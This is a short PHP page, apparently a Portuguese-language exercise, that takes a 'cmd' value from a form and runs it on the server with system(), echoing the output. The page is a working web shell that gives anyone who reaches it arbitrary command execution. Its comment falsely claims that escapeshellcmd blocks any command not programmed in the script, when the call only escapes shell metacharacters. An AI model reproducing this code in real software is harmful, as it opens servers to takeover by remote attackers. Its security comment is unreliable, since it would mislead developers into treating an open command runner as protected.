<?php

	if ($_SERVER["REQUEST_METHOD"] === 'POST') {

		// ESSE COMANDO SERVE PARA ESCAPAR QUALQUER TIPO DE COMANDO QUE NÃO ESTÁ PROGRAMADO NO SCRIPT
		$cmd = escapeshellcmd($_POST['cmd']);

		var_dump($cmd);

		echo "<pre>";

		// ESSE COMANDO É DO SISTEMA OPERACIONAL
		$comando = system($cmd, $retorno);

		echo "</pre>";


	}
	
	

?>

<form method="POST">
	<input type="text" name="cmd">
	<button type="submit">Enviar</button>
</form>